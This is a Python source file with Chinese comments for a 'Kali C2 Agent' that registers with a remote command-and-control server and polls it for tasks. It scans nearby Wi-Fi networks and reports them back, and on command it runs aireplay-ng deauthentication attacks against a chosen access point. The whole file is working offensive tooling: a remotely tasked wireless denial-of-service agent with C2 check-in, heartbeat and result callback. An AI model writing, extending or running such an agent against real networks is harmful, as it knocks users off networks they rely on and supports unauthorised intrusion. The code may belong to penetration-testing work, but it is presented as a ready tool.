import subprocess
import json
import time
import requests
import shutil
import os
import sys

# ================= 配置区域 =================
# 如果自动探测失败，请手动修改这里填写 Windows 后端的 IP
FIXED_C2_IP = ""
PORT = "8001"  # 注意：根据你的 main.py，端口是 8001
HEARTBEAT_INTERVAL = 2  # 心跳间隔(秒)


# ===========================================

def get_kali_interfaces():
    """获取网卡列表 (含驱动名)"""
    interfaces = []
    try:
        # 使用 ip link 获取基础信息
        out = subprocess.check_output(["ip", "-o", "link", "show"]).decode()
        for line in out.split('\n'):
            if ": " in line:
                parts = line.split(": ")
                if len(parts) < 2: continue

                iface = parts[1].split("@")[0].strip()
                if iface == "lo" or "eth" in iface or "docker" in iface: continue

                # 获取驱动
                driver = "Generic"
                try:
                    ethtool = subprocess.check_output(["ethtool", "-i", iface]).decode()
                    for l in ethtool.split("\n"):
                        if l.startswith("driver:"): driver = l.split(":")[1].strip()
                except:
                    pass

                # 获取模式
                mode = "Managed"
                try:
                    iw_info = subprocess.check_output(["iw", "dev", iface, "info"]).decode()
                    if "type monitor" in iw_info: mode = "Monitor"
                except:
                    pass

                interfaces.append({
                    "name": iface,
                    "display": f"{driver} ({iface})",  # 前端显示的友好名称
                    "mode": mode,
                    "is_wireless": True
                })
    except:
        pass

    # 兜底逻辑：如果没获取到，至少返回一个 wlan0
    if not interfaces:
        interfaces.append({"name": "wlan0", "display": "Generic (wlan0)", "mode": "Managed", "is_wireless": True})

    return interfaces


def perform_scan(interface):
    """执行扫描任务"""
    print(f"[+] 收到扫描任务，使用网卡: {interface}")
    networks = []

    # 尝试使用 nmcli (最稳健)
    try:
        # 字段: SSID, BSSID, CHAN, SIGNAL, SECURITY
        cmd = ["nmcli", "-t", "-f", "SSID,BSSID,CHAN,SIGNAL,SECURITY", "dev", "wifi", "list"]
        if interface: cmd.extend(["ifname", interface])

        output = subprocess.check_output(cmd).decode('utf-8', errors='ignore')
        for line in output.split('\n'):
            line = line.strip()
            if not line: continue

            # nmcli -t 用冒号分隔，但 BSSID 里也有冒号，需倒序解析
            parts = line.split(':')
            if len(parts) >= 4:
                # 倒序取值
                sec = parts[-1]
                sig_raw = parts[-2]
                chan = parts[-3]

                # BSSID 是中间那段
                bssid = ":".join(parts[-9:-3]) if len(parts) >= 9 else "Unknown"
                # SSID 是剩下的前面所有
                ssid = line.split(bssid)[0].strip(':')

                if not ssid: ssid = "<Hidden>"

                # 信号处理
                try:
                    signal_val = int(sig_raw)
                    # nmcli 有时返回 %, 有时返回 bar。简单转换:
                    dbm = int((signal_val / 2) - 100) if signal_val > 0 else -100
                except:
                    dbm = -80

                networks.append({
                    "ssid": ssid,
                    "bssid": bssid,
                    "channel": int(chan) if chan.isdigit() else 1,
                    "signal": dbm,
                    "encryption": sec,
                    "clients": -1,  # 占位符，普通扫描无法获取
                    "vendor": "Unknown"  # 后端会再次处理 OUI
                })
    except Exception as e:
        print(f"[-] nmcli 扫描失败: {e}")

    return networks


def perform_attack(params):
    """执行攻击任务"""
    target = params.get('bssid')
    channel = params.get('channel')
    iface = params.get('interface', 'wlan0')

    print(f"[+] 执行 Deauth 攻击 -> Target: {target} on CH: {channel}")

    try:
        # 1. 切信道
        subprocess.run(["iwconfig", iface, "channel", str(channel)], stderr=subprocess.DEVNULL)
        # 2. 发包 (aireplay-ng)
        # -0 5: 发送 5 组 Deauth 包
        subprocess.Popen(["aireplay-ng", "-0", "5", "-a", target, iface], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[-] 攻击失败: {e}")


def main():
    print(f"[*] Kali C2 Agent v5.0 (Daemon Mode)")

    # 1. 自动寻找 C2 服务器 IP
    c2_ip = FIXED_C2_IP
    if not c2_ip:
        # 尝试获取默认网关 (通常宿主机就是网关)
        try:
            gateway = os.popen("ip route show | grep default | awk '{print $3}'").read().strip()
            # 如果是在 VirtualBox/VMware NAT 模式，网关通常是 .1 或 .2
        except:
            gateway = "127.0.0.1"

        print(f"[?] 检测到网关 IP: {gateway}")
        user_input = input(f"[?] 请输入 Windows 后端 IP (回车使用 {gateway}): ").strip()
        c2_ip = user_input if user_input else gateway

    base_url = f"http://{c2_ip}:{PORT}/api/v1/wifi"
    print(f"[*] Connecting to C2 Server: {base_url}")

    # 2. 注册上线 (发送网卡信息)
    ifaces = get_kali_interfaces()
    try:
        requests.post(f"{base_url}/register_agent", json={"interfaces": ifaces}, timeout=5)
        print(f"[+] Agent 上线成功！已上报 {len(ifaces)} 个网卡。")
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        print("请检查: 1. Windows 防火墙是否关闭 8001 端口。 2. IP 是否正确。")
        return

    # 3. 进入守护循环
    print("[*] 进入守护模式，等待任务...")
    while True:
        try:
            # 发送心跳，获取任务
            r = requests.get(f"{base_url}/agent/heartbeat", timeout=5)
            if r.status_code == 200:
                data = r.json()
                task = data.get("task")

                if task == "scan":
                    params = data.get("params", {})
                    iface = params.get("interface")
                    # 自动回落逻辑
                    if not iface:
                        iface = ifaces[0]['name'] if ifaces else "wlan0"

                    # 执行扫描
                    results = perform_scan(iface)

                    # 回传结果
                    requests.post(f"{base_url}/callback", json={
                        "interface": iface,
                        "count": len(results),
                        "networks": results
                    })
                    print(f"[+] 任务完成: 扫描到 {len(results)} 个目标，已回传。")

                elif task == "attack":
                    perform_attack(data.get("params", {}))

                elif task == "idle":
                    pass  # 空闲状态

        except requests.exceptions.ConnectionError:
            print("\n[!] C2 服务器连接断开，正在重试...")
            time.sleep(2)
        except Exception as e:
            print(f"\n[!] 未知错误: {e}")

        time.sleep(HEARTBEAT_INTERVAL)


if __name__ == "__main__":
    main()